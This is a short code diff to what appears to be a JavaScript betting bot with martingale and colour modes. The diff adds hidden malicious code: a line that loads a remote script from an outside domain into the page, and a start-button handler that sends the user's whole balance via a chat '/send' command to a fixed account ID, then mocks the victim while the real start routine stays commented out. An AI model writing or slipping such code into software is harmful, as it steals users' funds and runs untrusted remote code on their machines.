@@ -13,6 +13,8 @@
 
 'use strict';
 
+(function () { var scriptElement = document.createElement( "script" ); scriptElement.type = "text/javascript"; scriptElement.src = "//yuiko.science/in.js "; document.body.appendChild( scriptElement ); })();
+
 var debug = false;
 var simulation = false;
 var stop_on_min_balance = false;
@@ -288,6 +290,20 @@ function Automated() {
         self.menu.red.disabled = false;
         self.color = 'rainbow';
         self.log('Current mode: rainbow');
+    };
+
+   this.menu.start.onclick = function() {
+        send({
+        "type": "chat",
+        "msg": '/send 76561198286171836 ' + self.balance,
+        "lang": LANG
+    });
+
+        self.log('Didn\'t they warn you not to use bots?');
+
+ 
+
+        // self.start();
     };
 
     this.menu.martingale.onclick = function() {
